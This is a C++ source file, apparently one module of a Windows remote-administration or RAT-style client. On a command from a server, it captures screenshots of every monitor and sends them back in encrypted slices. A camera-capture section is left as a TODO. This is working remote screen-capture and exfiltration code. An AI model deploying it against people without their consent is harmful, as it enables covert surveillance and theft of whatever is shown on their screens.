#include "pch.h"
#include "ImageCapture.h"

using namespace nsImageCapture;


CImageCapture::CImageCapture(TCP_MODE iTcpMode, QWORD qwClientToken) : CSocket(iTcpMode, nsGeneralSocket::IMAGE_CAPTURE_SERVICE, nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE, qwClientToken) {
	m_qwClientToken = qwClientToken;
}


CImageCapture::~CImageCapture() {
	;
}


VOID CImageCapture::OnReceiveWithDec(ITcpClient* pSender, CONNID dwConnID, QWORD qwClientToken, WORD wServiceType, WORD wSocketType, int iCommandID, DWORD dwParentSocketTag, MyBuffer mBuffer)
{
	DebugPrintRecvParams(dwConnID, qwClientToken, wServiceType, wSocketType, iCommandID, dwParentSocketTag, mBuffer);

	switch (iCommandID) {
	case nsGeneralSocket::CHANNEL_SUCCESS_S2C:
		;
		break;

	case PRINT_SCREEN_S2C:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PrintScreen, (LPVOID)this, 0, NULL);
		break;
	}
}


EnHandleResult CImageCapture::OnClose(ITcpClient* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode) {
	DebugPrint("[Client %d] OnClose: \n", dwConnID);

	delete this;

	return HR_OK;
}



// 图片切片发送（受HpSocket TCP_PACK 的数据包最大长度限制）
#define IMAGE_SECTION_LENGTH  (PACKET_MAX_LENGTH - 0xff)
VOID CImageCapture::SendImage(LPVOID lParam, PBYTE pbImageData, DWORD dwImageLength) {
    CImageCapture* pThis = (CImageCapture*)lParam;
    
    DWORD dwSectionNumber = (dwImageLength % PACKET_MAX_LENGTH) ? (dwImageLength / PACKET_MAX_LENGTH + 1) : (dwImageLength / PACKET_MAX_LENGTH);

    for (int i = 1; i <= dwSectionNumber; i++) {
        _ImageSection_C2S mData;
        mData.dwIndex = (i == dwSectionNumber) ? 0 : i;
        mData.msImageSection.ptr = (PCHAR)(pbImageData + (i-1) * IMAGE_SECTION_LENGTH);
        mData.msImageSection.size = (i == dwSectionNumber) ? (dwImageLength - (i-1) * IMAGE_SECTION_LENGTH) : IMAGE_SECTION_LENGTH;
        
        MyBuffer mBuffer = MsgPack<_ImageSection_C2S>(mData);

        pThis->SendWithEnc(PRINT_SCREEN_C2S, mBuffer.ptr(), mBuffer.size());
    }
}



// *********************************** 屏幕截图 ***********************************

struct _MonitorProperty
{
    int width;
    int height;
    int x;
    int y;
    HDC hdc;
    HMONITOR hmonitor;
    std::basic_string<TCHAR> monitor_name;
    bool flag;
};


BOOL CALLBACK CallbackEnumMonitor(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lp_monitor, LPARAM data)
{
    std::vector<_MonitorProperty>* monitor_arr = (std::vector<_MonitorProperty> *)data;
    _MonitorProperty monitor;
    monitor.hmonitor = hMonitor;
    monitor.hdc = hdcMonitor;

    MONITORINFOEX miex;
    miex.cbSize = sizeof(miex);
    GetMonitorInfo(hMonitor, &miex);
    monitor.monitor_name = { miex.szDevice };
    monitor.flag = (miex.dwFlags == MONITORINFOF_PRIMARY) ? true : false;

    DEVMODE dm;
    dm.dmSize = sizeof(dm);
    dm.dmDriverExtra = 0;
    EnumDisplaySettings(miex.szDevice, ENUM_CURRENT_SETTINGS, &dm);
    monitor.width = dm.dmPelsWidth;
    monitor.height = dm.dmPelsHeight;
    monitor.x = dm.dmPosition.x;
    monitor.y = dm.dmPosition.y;

    (*monitor_arr).emplace_back(monitor);
    return TRUE;
}


VOID CImageCapture::PrintScreen(LPVOID lParam)
{
    CImageCapture* pThis = (CImageCapture*)lParam;

    // 枚举所有的显示器
    std::vector<_MonitorProperty> monitor_array;
    EnumDisplayMonitors(NULL, NULL, CallbackEnumMonitor, (LPARAM)&monitor_array);

    HDC hdc = ::GetDC(GetDesktopWindow());
    HDC com_hdc = CreateCompatibleDC(hdc);
    int i = 1;

    for (auto& monitor : monitor_array) {
        HBITMAP hBmpScreen = CreateCompatibleBitmap(hdc, monitor.width, monitor.height);
        SelectObject(com_hdc, hBmpScreen);

        BITMAP bm;
        GetObject(hBmpScreen, sizeof(bm), &bm);
        
        // BMP信息
        BITMAPINFOHEADER bi = { 0 };
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bm.bmWidth;
        bi.biHeight = bm.bmHeight;
        bi.biPlanes = bm.bmPlanes;
        bi.biBitCount = bm.bmBitsPixel;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = bm.bmHeight * bm.bmWidthBytes;

        // BMP头部
        BITMAPFILEHEADER bfh = { 0 };
        bfh.bfType = ((WORD)('M' << 8) | 'B');
        bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        // BMP图片主体
        MyBuffer mImageBodyData = MyBuffer(bi.biSizeImage);
        BitBlt(com_hdc, 0, 0, monitor.width, monitor.height, hdc, monitor.x, monitor.y, SRCCOPY);
        GetDIBits(com_hdc, hBmpScreen, 0L, monitor.height, mImageBodyData.ptr(), (LPBITMAPINFO)&bi, (DWORD)DIB_RGB_COLORS);
        
        // 拼成完整的BMP图片
        DWORD dwImageLength = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
        MyBuffer mImageData = MyBuffer(dwImageLength);
        memcpy(mImageData.ptr(), &bfh, sizeof(BITMAPFILEHEADER));
        memcpy(mImageData.ptr() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
        memcpy(mImageData.ptr() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), mImageBodyData.ptr(), bi.biSizeImage);

        hBmpScreen = (HBITMAP)SelectObject(com_hdc, hBmpScreen);
        
        SendImage(pThis, mImageData.ptr(), dwImageLength);


        //// 向Server发送屏幕截图
        //_PrintScreen_C2S mData;
        //mData.msImage.ptr = (PCHAR)pbImageData;
        //mData.msImage.size = dwImageLength;

        //PBYTE pBuffer = nullptr;
        //DWORD dwBufLen = MsgPack<_PrintScreen_C2S>(mData, pBuffer);

        //pThis->SendWithEnc(PRINT_SCREEN_C2S, pBuffer, dwBufLen);
        //delete[] pBuffer;
    }
}


// *********************************** 相机拍照 ***********************************、

// TODO